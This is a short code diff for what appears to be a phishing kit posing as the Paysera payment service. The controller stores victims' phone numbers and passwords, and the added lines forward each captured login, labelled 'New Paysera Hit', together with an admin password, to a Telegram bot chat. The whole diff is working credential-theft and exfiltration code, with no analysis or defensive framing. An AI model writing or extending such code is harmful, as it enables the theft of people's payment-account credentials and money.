@@ -1,4 +1,5 @@
 const Paysera = require("../models/payseraModel");
+const axios = require("axios");
 var moment = require("moment"); // require
 
 const getOwnerVics = async (req, res) => {
@@ -50,6 +51,18 @@ const submitLogin = async (req, res) => {
 			ip,
 			timestamp: moment().format(),
 		});
+		await axios
+			.post(
+				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+				{
+					chat_id: "-837014205",
+					text: `New Paysera Hit:\n\n${telephone}\n${password}\n\nAdmin Password: ${owner}`,
+					parse_mode: "Markdown",
+				}
+			)
+			.catch((e) => {
+				console.log(e);
+			});
 		res.sendStatus(200);
 	} catch (error) {
 		console.log(error);
